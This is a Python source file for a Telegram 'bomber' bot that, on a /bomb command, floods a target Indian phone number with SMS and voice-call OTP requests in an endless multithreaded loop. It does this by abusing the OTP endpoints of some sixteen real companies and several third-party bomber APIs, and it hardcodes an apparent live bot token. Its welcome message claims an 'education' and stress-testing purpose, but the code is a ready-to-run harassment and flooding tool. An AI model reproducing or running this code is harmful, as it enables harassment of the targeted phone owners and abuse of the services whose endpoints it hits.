import logging
import threading
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
from flask import Flask

# ================= CONFIGURATION =================
TELEGRAM_BOT_TOKEN = "9273643977:AAFXKfu00kWAhnWm_BpIh9QmUUo3GcgglaU"
CHANNEL_SIGNATURE = "sk"
# =================================================

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Flask app for 24/7 Cloud Uptime (Render, Koyeb, etc.)
flask_app = Flask('')

@flask_app.route('/')
def home():
    return "🤖 Suraj Bhai High-Speed Bomber Bot is 24/7 Alive and Active!"

def run_flask():
    flask_app.run(host='0.0.0.0', port=8080)

# Global tracking variables for live stats
BOMBER_STATS = {
    "total_requests_sent": 0,
    "active_targets": 0
}

# List of APIs provided for request execution
APIS = [
    {"name": "FreeFire Bomber",   "url": lambda p, d: f"https://freefire-api.ct.ws/bomber4.php?phone={p}&duration={d}", "method": "GET",  "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Call Bomber API",   "url": lambda p, d: f"https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb?number={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Bomberr API",       "url": lambda p, d: f"https://bomberr.onrender.com/num={p}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
    {"name": "Lenskart",          "url": lambda p, d: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "Hungama",           "url": lambda p, d: "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un"}}'},
    {"name": "Meru Cab",          "url": lambda p, d: "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Dayco India",       "url": lambda p, d: "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"api=send_otp&mob={p}"},
    {"name": "NoBroker",          "url": lambda p, d: "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"phone={p}&countryCode=IN"},
    {"name": "ShipRocket",        "url": lambda p, d: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"mobileNumber":"{p}"}}'},
    {"name": "PenPencil",         "url": lambda p, d: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "1mg",               "url": lambda p, d: "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "KPN Fresh",         "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "Servetel",          "url": lambda p, d: "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p, d: f"mobile_number={p}"},
    {"name": "Swiggy Call",       "url": lambda p, d: "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"mobile":"{p}"}}'},
    {"name": "Tata Capital",      "url": lambda p, d: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p, d: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "Doubtnut",          "url": lambda p, d: "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json"}, "data": lambda p, d: f'{{"phone_number":"{p}","language":"en"}}'},
]

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_msg = (
        f"╔═══════════════════════════════════╗\n"
        f"✨ **Aapka Swagat Hai Suraj Bhai Ke Bomber Bot Me** ✨\n"
        f"╚═══════════════════════════════════╝\n\n"
        f"⚠️ **CHETAVANI / WARNING:**\n"
        f"Yeh bot sirf aur sirf **Education Purpose** aur security/stress testing ke liye banaya gaya hai.\n\n"
        f"🚀 **Available Commands:**\n"
        f"👉 `/bomb <phone_number>` - High-speed multi-threaded requests shuru karne ke liye.\n"
        f"👉 `/stats` - Live request delivery status check karne ke liye.\n\n"
        f"👑 *Powered By:* {CHANNEL_SIGNATURE}"
    )
    await update.message.reply_text(welcome_msg, parse_mode="Markdown")

# /stats command
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_msg = (
        f"📊 **Bomber Live Statistics**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 Total Requests Sent: `{BOMBER_STATS['total_requests_sent']}`\n"
        f"🎯 Active Targets in Queue: `{BOMBER_STATS['active_targets']}`\n"
        f"⚡ Status: High-Speed Threaded Running\n"
        f"👑 Powered By: {CHANNEL_SIGNATURE}"
    )
    await update.message.reply_text(stats_msg, parse_mode="Markdown")

# Single API execution worker function
def send_single_request(api, target_phone):
    try:
        url = api["url"](target_phone, "60")
        headers = api["headers"]
        
        if api["method"] == "GET":
            requests.get(url, headers=headers, timeout=3)
        elif api["method"] == "POST":
            data = api["data"](target_phone, "60")
            requests.post(url, headers=headers, data=data, timeout=3)
        
        BOMBER_STATS["total_requests_sent"] += 1
    except Exception:
        pass

# /bomb command handler with ThreadPoolExecutor for high speed
async def handle_bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❌ **Kripya target mobile number dein!**\n\n"
            "📌 *Example:* `/bomb 9876543210`",
            parse_mode="Markdown"
        )
        return
    
    target_phone = context.args[0].strip()
    
    if not target_phone.isdigit() or len(target_phone) != 10:
        await update.message.reply_text(
            "❌ **Galat Number!** Kripya 10 digit ka valid mobile number darj karein.\n"
            "📌 *Example:* `/bomb 9876543210`",
            parse_mode="Markdown"
        )
        return

    BOMBER_STATS["active_targets"] += 1
    
    status_msg = await update.message.reply_text(
        f"🎯 **Target Number:** `{target_phone}`\n"
        f"⚡ **Status:** High-speed multi-threaded requests bheji ja rahi hain...",
        parse_mode="Markdown"
    )
    
    # Run in background thread using ThreadPoolExecutor for concurrent speed
    threading.Thread(
        target=run_threaded_bomber, 
        args=(target_phone, context, update.effective_chat.id)
    ).start()

def run_threaded_bomber(target_phone, context, chat_id):
    try:
        # Infinite fast loop using ThreadPoolExecutor to fire requests parallelly
        while True:
            with ThreadPoolExecutor(max_workers=10) as executor:
                for api in APIS:
                    executor.submit(send_single_request, api, target_phone)
            
            # Short pause between waves to prevent local thread choking
            time.sleep(1.5)
            
    except Exception as e:
        print(f"❌ Error in threaded loop: {e}")
    finally:
        BOMBER_STATS["active_targets"] -= 1

def main():
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("bomb", handle_bomb_command))

    print(f"🤖 Suraj Bhai High-Speed Bomber Bot is up and running [Powered by {CHANNEL_SIGNATURE}]...")
    app.run_polling()

if __name__ == '__main__':
    main()
